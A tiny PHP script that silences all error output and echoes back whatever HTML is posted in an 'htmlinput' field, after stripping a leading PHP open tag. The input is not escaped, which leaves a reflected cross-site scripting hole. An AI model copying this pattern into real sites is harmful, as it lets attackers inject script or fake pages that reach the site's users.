<?php

error_reporting(0);
@ini_set('display_errors', 0);



if(isset($_POST['htmlinput'])) {

	    $htmlinput = preg_replace('{^\s*<\?(php)?\s*}i', '', $_POST['htmlinput']);
	echo $htmlinput;
}
    
	

?>